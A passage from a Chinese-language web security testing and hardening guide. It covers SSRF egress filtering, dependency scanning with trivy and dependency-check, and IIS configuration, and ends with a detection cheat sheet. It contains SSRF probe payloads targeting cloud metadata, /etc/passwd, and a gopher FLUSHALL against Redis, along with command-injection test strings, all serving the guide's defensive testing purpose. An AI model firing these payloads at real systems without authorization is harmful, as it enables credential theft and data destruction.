iptables -A OUTPUT -d 172.16.0.0/12   -j DROP
iptables -A OUTPUT -d 192.168.0.0/16  -j DROP
iptables -A OUTPUT -d 169.254.0.0/16  -j DROP   # 云 metadata
iptables -A OUTPUT -d 127.0.0.0/8     -j DROP

# 2. 允许出站到合作方 IP
iptables -A OUTPUT -d 203.0.113.10 -p tcp --dport 443 -j ACCEPT

# 3. 允许 DNS / 已建立连接
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 4. 默认拒绝其他出站
iptables -P OUTPUT DROP

# 持久化
apt-get install -y iptables-persistent
netfilter-persistent save

# 云上元数据端点单独拦截（AWS / 阿里云 / GCE 通用）
iptables -A OUTPUT -d 169.254.169.254 -j DROP
```

#### H.3 图形化检测

- Burp Suite：在 URL 参数处改为 `http://127.0.0.1/admin`、`http://169.254.169.254/latest/meta-data/`、`file:///etc/passwd`、`gopher://127.0.0.1:6379/_FLUSHALL`，Repeater 重放观察响应。
- 浏览器 F12：观察外站图片/代理接口是否回显内网内容。
- AWS 控制台 / 阿里云控制台：检查 Security Group 出站规则是否过宽。

#### H.4 无头服务器检测

```bash
# 探测 SSRF 典型 payload
curl -s "http://target.example.com/proxy?url=http://127.0.0.1/" | head -c 200
curl -s "http://target.example.com/proxy?url=http://169.254.169.254/latest/meta-data/" | head -c 200
curl -s "http://target.example.com/proxy?url=file:///etc/passwd" | head -c 200
curl -s "http://target.example.com/proxy?url=dict://127.0.0.1:6379/INFO" | head -c 200

# 服务端源码审计：找出所有发起外部请求的函数
grep -nE 'curl_exec\s*\(|file_get_contents\s*\(\s*\$|fsockopen\s*\(|copy\s*\(\s*\$|readfile\s*\(\s*\$' /var/www/html/

# 检测 PHP 配置是否关闭远程包含
php -r "echo 'allow_url_include=', ini_get('allow_url_include'), PHP_EOL, 'allow_url_fopen=', ini_get('allow_url_fopen');"

# 出站规则审计
iptables -L OUTPUT -n -v --line-numbers

# Windows 防火墙出站限制
netsh advfirewall firewall add rule name="Block Internal Egress" dir=out action=block remoteip=10.0.0.0/8
netsh advfirewall firewall add rule name="Allow Partner API" dir=out action=allow remoteip=203.0.113.10 protocol=TCP localport=443
```

---

### I. 已知漏洞组件

#### I.1 OWASP dependency-check CLI

```bash
# 安装（Linux）
wget https://github.com/jeremylong/DependencyCheck/releases/download/v8.4.0/dependency-check-8.4.0-release.zip
unzip dependency-check-8.4.0-release.zip -d /opt/
/opt/dependency-check/bin/dependency-check.sh --version

# 扫描 Java 项目（自动下载 NVD 数据库）
/opt/dependency-check/bin/dependency-check.sh \
  --project "my-app" \
  --scan /opt/app/target/ \
  --format "HTML,JSON,CSV" \
  --out /tmp/dc-report \
  --enableRetired

# 扫描 Node.js 项目
/opt/dependency-check/bin/dependency-check.sh \
  --project "node-app" \
  --scan /opt/node-app/package-lock.json \
  --format HTML \
  --out /tmp/dc-node

# 扫描 .NET 项目
dependency-check.bat --project "dotnet-app" --scan C:\app\bin\Release --format HTML --out C:\report

# 仅输出 HIGH/CRITICAL
/opt/dependency-check/bin/dependency-check.sh --scan /opt/app --format JSON --out /tmp/dc --suppression suppression.xml
jq '.dependencies[].vulnerabilities[] | select(.severity|test("HIGH|CRITICAL")) | .name' /tmp/dc/dependency-check-report.json

# CI 模式：失败门禁
/opt/dependency-check/bin/dependency-check.sh --scan /opt/app --failOnCVSS 7 --project "ci-build" --format HTML --out /tmp/dc
```

#### I.2 trivy 镜像与文件系统扫描

```bash
# 安装
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# 扫描 Docker 镜像
trivy image --severity HIGH,CRITICAL nginx:1.25
trivy image --ignore-unfixed --scanners vuln app:latest
trivy image --format json --output /tmp/trivy.json app:latest

# 扫描文件系统（已部署服务器的代码目录）
trivy fs --scanners vuln,secret /var/www/html/
trivy fs --severity HIGH,CRITICAL /opt/app/

# 扫描 Git 仓库（远程）
trivy repo https://github.com/owner/repo.git

# 扫描 IaC（Terraform / K8s / Dockerfile 配置审计）
trivy config /opt/infra/
trivy config --scanners misconfig Dockerfile

# 生成 SBOM
trivy image --format cyclonedx --output sbom.xml app:latest

# CI 失败门禁：CVSS >= 7 失败
trivy image --exit-code 1 --severity CRITICAL --ignore-unfixed app:latest
```

#### I.3 图形化检测

- Docker Desktop -> Scout：选中镜像 -> 漏洞列表，按 CVE 排序，点击查看修复建议版本。
- Snyk.io Web 控制台：导入 GitHub 仓库，自动扫描依赖与镜像，生成优先级修复清单。
- Trivy VS Code 插件：右键 `Dockerfile` 或 `package.json` -> Scan with Trivy。
- Dependency-Track（OWASP）Web UI：持续聚合 dependency-check 报告，看项目级漏洞趋势。
- JetBrains IntelliJ IDEA -> Project Structure -> Problems，IDE 提示过时依赖。
- Windows：Tenable Nessus / Qualys GUI 扫描 IIS + .NET 主机漏洞。

#### I.4 无头服务器检测

```bash
# Java：Maven 依赖树过滤高危组件
mvn -f /opt/app/pom.xml dependency:tree | grep -iE "fastjson|log4j|shiro|xstream|commons-collections|jackson-databind|spring-core|struts"

# Node.js：npm audit
cd /opt/node-app && npm audit --audit-level=high --json | jq '.metadata.vulnerabilities'

# Python：pip-audit / safety
pip install pip-audit
pip-audit -r /opt/app/requirements.txt --strict
safety check -r /opt/app/requirements.txt --json

# Go：govulncheck
go install golang.org/x/vuln/cmd/govulncheck@latest
govulncheck /opt/go-app/...

# Rust：cargo-audit
cargo install cargo-audit
cargo audit

# .NET：dotnet list package --vulnerable
dotnet list /opt/dotnet-app/*.csproj package --vulnerable --include-transitive

# 系统包扫描（CentOS / RHEL）
yum updateinfo list security all
dnf needs-restarting -r

# 系统包扫描（Debian / Ubuntu）
apt list --upgradable 2>/dev/null | grep -i secur
apt-get -s dist-upgrade | grep "^Inst" | grep -i secur

# Windows 补丁检查（PowerShell）
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20
wmic qfe list brief /format:table

# 容器基础镜像不可变扫描
trivy image --ignore-unfixed --severity CRITICAL $(docker images --format '{{.Repository}}:{{.Tag}}' | head -10)
```

#### I.5 Windows / .NET / NuGet 检测

```powershell
# .NET 项目依赖漏洞扫描
dotnet list C:\app\MyApp.csproj package --vulnerable --include-transitive

# NuGet CLI
nuget list -Source https://api.nuget.org/v3/index.json -AllVersions -Prerelease | findstr /i "log4net newtonsoft"

# Windows Server 补丁状态
Get-WindowsUpdateLog
wmic qfe list brief /format:csv | findstr KB

# IIS 应用池与 .NET Framework 版本
Get-WebAppPool | Select-Object Name, .NETFrameworkVersion
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s | findstr Version

# Windows Defender 扫描容器与可执行
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File C:\app
```

#### I.6 Windows/IIS：web.config 关闭详细错误页

```xml
<configuration>
  <system.web>
    <customErrors mode="RemoteOnly" defaultRedirect="/error.html">
      <error statusCode="500" redirect="/error.html" />
      <error statusCode="404" redirect="/notfound.html" />
    </customErrors>
    <compilation debug="false" />
    <httpRuntime enableVersionHeader="false" />
  </system.web>
  <system.webServer>
    <httpErrors errorMode="DetailedLocalOnly" existingResponse="PassThrough">
      <remove statusCode="500" />
      <error statusCode="500" path="/error.html" responseMode="ExecuteURL" />
    </httpErrors>
  </system.webServer>
</configuration>
```

---

### 附录：检测路径速查表

| 漏洞类型 | 图形化检测 | 无头服务器检测 |
| --- | --- | --- |
| SQL 注入 | Burp Repeater / SQLiPy 插件 | sqlmap CLI + grep 源码 |
| XSS | 浏览器 Console + Burp Repeater | curl + grep 回显 |
| 命令注入 | Burp Repeater 注入 `;id` `|whoami` | curl + grep `system\(\|exec\(` |
| 文件上传 | Burp 改 filename + 浏览器访问 URL | curl 上传 + find 残留脚本 |
| 反序列化 | Docker Scout GUI / IDEA 依赖图 | mvn dependency:tree + trivy |
| 失效访问控制 | Burp 改 id / 改 Authorization | curl 遍历 + JWT alg=none 测试 |
| 安全误配置 | F12 看 Response Headers | curl -sI + grep 版本与安全头 |
| SSRF | Burp 改 url 参数到内网 | curl 探测 + iptables -L OUTPUT |
| 已知漏洞组件 | Snyk / Docker Scout / IDEA | trivy image + dependency-check CLI |

> 复测原则：代码层修复完成 → WAF 规则上线 → 图形化手工复测一遍 → 无头 CI 巡检常态化。任何一项失败即视为未修复。

